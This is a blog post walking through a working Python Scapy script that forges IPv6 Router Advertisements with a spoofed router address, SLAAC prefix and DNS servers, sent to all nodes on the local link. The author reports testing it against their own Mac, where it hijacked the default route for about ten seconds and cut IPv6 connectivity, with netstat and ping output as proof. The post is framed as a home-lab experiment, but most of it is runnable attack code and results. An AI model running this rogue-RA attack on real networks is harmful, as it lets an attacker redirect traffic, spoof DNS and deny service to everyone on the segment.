---
title: Python Scapy crafting ICMPv6 RA
date: 2025-10-26 18:30:00 -0700
categories: [PYTHON, SCAPY]
tags: [python, scapy]     # TAG names should always be lowercase
---

![]({{ site.baseurl }}/images/services/python_logo.png)

Running `Python 3.12.3` and `scapy 2.6.1`

```bash
(venv) gus@ubuntu:~$ sudo $(which python3) --version
Python 3.12.3
```

```bash
(venv) gus@ubuntu:~$ pip show scapy
Name: scapy
Version: 2.6.1
Summary: Scapy: interactive packet manipulation tool
Home-page:
Author: Philippe BIONDI
Author-email:
License: GPL-2.0-only
Location: /home/gus/venv/lib/python3.12/site-packages
Requires:
Required-by:
(venv) gus@ubuntu:~$
```

- To run the script using `sudo` within a `venv` python environment

```
sudo $(which python3) ipv6_icmpv6_ra1.py
```

- To test python code quickly using single liners

```
python -c "from scapy.all import ICMPv6ND_RA; ICMPv6ND_RA().show()"
```

- The script is the following one.

```python
#!/usr/bin/env python3
# scapy 2.6.1 compatible RA forge example
# Save as ipv6_icmpv6_ra_scapy.py and run with sudo/python from your venv

from scapy.all import (
    Ether, IPv6,
    ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptMTU, ICMPv6NDOptRDNSS,
    sendp, conf
)
from scapy.utils import hexdump

# ------------------ USER-CHANGEABLE VARIABLES ------------------
IFACE = "ens160"                    # interface to send on
SRC_MAC = "00:11:22:33:44:55"     # forged source MAC
SRC_IPV6 = "fe80::221:11ff:fe33:4455"  # forged IPv6 source (link-local typical)
DST_IPV6 = "ff02::1"              # all-nodes multicast
DST_MAC = "33:33:00:00:00:01"      # multicast mac for ff02::1

ROUTER_LIFETIME = 1800            # seconds (0 = not a default router)
HOP_LIMIT = 64                    # chlim (current hop limit)
REACHABLE_TIME = 0                # milliseconds
RETRANS_TIMER = 3000              # milliseconds (retransmit timer)

# Prefix info (SLAAC)
PREFIX = "2001:db8:dead:beef::"
PREFIX_LEN = 64
VALID_LIFETIME = 3600
PREFERRED_LIFETIME = 1800
ON_LINK_FLAG = 1
AUTONOMOUS_FLAG = 1

# RDNSS (DNS servers) - optional
RDNSS = ["2001:4860:4860::8888", "2001:4860:4860::8844"]
# ------------------ end user vars --------------------------------

conf.iface = IFACE

eth = Ether(src=SRC_MAC, dst=DST_MAC)
ip6 = IPv6(src=SRC_IPV6, dst=DST_IPV6)

# Build a base RA and set common fields.
# Scapy 2.6.1 expects 'retrans_timer' (not 'retransmittimer').
# We set known fields; attempt to set retrans field using a small fallback loop.
ra = ICMPv6ND_RA(
    routerlifetime=int(ROUTER_LIFETIME),
    chlim=int(HOP_LIMIT),
    reachabletime=int(REACHABLE_TIME),
)

# Try to set retransmit timer using common candidate names.
# For scapy 2.6.1 the likely correct name is 'retrans_timer'.
retrans_candidates = ("retrans_timer", "retrans", "retransmit", "retransmittimer")
set_retrans_ok = False
for cand in retrans_candidates:
    try:
        setattr(ra, cand, int(RETRANS_TIMER))
        set_retrans_ok = True
        # print which one worked (only if running interactively)
        # print("Using retrans field name:", cand)
        break
    except Exception:
        # attribute may not exist — continue trying
        pass

if not set_retrans_ok:
    # As a last resort, attach raw bytes: build a new RA with correct values by
    # setting fields in the _fields_ dict is not recommended here; instead
    # inform the user and continue (packet will omit retrans timer).
    print("Warning: could not set retransmit timer field on ICMPv6ND_RA; packet will omit it.")

# Attach Source Link-Layer Address option
slla = ICMPv6NDOptSrcLLAddr(lladdr=SRC_MAC)

# Prefix information option (SLAAC)
pinfo = ICMPv6NDOptPrefixInfo(
    prefixlen=int(PREFIX_LEN),
    L=int(ON_LINK_FLAG),
    A=int(AUTONOMOUS_FLAG),
    validlifetime=int(VALID_LIFETIME),
    preferredlifetime=int(PREFERRED_LIFETIME),
    prefix=PREFIX
)

# MTU option
mtu_opt = ICMPv6NDOptMTU(mtu=1500)

# RDNSS (if available in your Scapy)
rdnss_opt = None
if RDNSS:
    try:
        rdnss_opt = ICMPv6NDOptRDNSS(lifetime=3600, dns=RDNSS)
    except Exception:
        # Older Scapy builds may not include this option class. Skip if not present.
        rdnss_opt = None

# Combine packet
pkt = eth / ip6 / ra / slla / pinfo / mtu_opt
if rdnss_opt:
    pkt = pkt / rdnss_opt

# Show packet for confirmation before sending
pkt.show()
print()
hexdump(pkt)

# Send packet once (change count and inter if you want multiple)
sendp(pkt, iface=IFACE, count=1, inter=0.2, verbose=True)
```

I seem to be able to poision the Routing Table of my macOS for 10 seconds causing a DDOS for IPv6.

- Default Route on my macOS

```bash
$ netstat -nr -f inet6 | grep default | grep en0
default                                 fe80::e83:ccff:fefb:a107%en0            UGcg                  en0
```

- Executing the script on my Ubuntu

```bash
(venv) gus@ubuntu:~$ sudo $(which python3) ipv6_icmpv6_ra1.py
```

- The Default Route on my macOS changes for approx 10 seconds

```bash
$ netstat -nr -f inet6 | grep default | grep en0
default                                 fe80::221:11ff:fe33:4455%en0            UGcg                  en0
```

- And during those 10 seconds ping6 to the Internet stopped working as can be seen here the gap from `icmp_seq=10` to `icmp_seq=19`.

```bash
$ ping6 2001:4860:4860::8888
PING6(56=40+8+8 bytes) 2602:61:71e7:b501:290c:4492:68fb:54c3 --> 2001:4860:4860::8888
16 bytes from 2001:4860:4860::8888, icmp_seq=0 hlim=117 time=27.913 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=1 hlim=117 time=23.264 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=2 hlim=117 time=31.688 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=3 hlim=117 time=23.628 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=4 hlim=117 time=19.896 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=5 hlim=117 time=19.655 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=6 hlim=117 time=17.982 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=7 hlim=117 time=22.072 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=8 hlim=117 time=17.466 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=9 hlim=117 time=14.706 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=10 hlim=117 time=20.411 ms



16 bytes from 2001:4860:4860::8888, icmp_seq=19 hlim=117 time=24.447 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=20 hlim=117 time=25.626 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=21 hlim=117 time=20.598 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=22 hlim=117 time=19.692 ms
16 bytes from 2001:4860:4860::8888, icmp_seq=23 hlim=117 time=20.899 ms
```
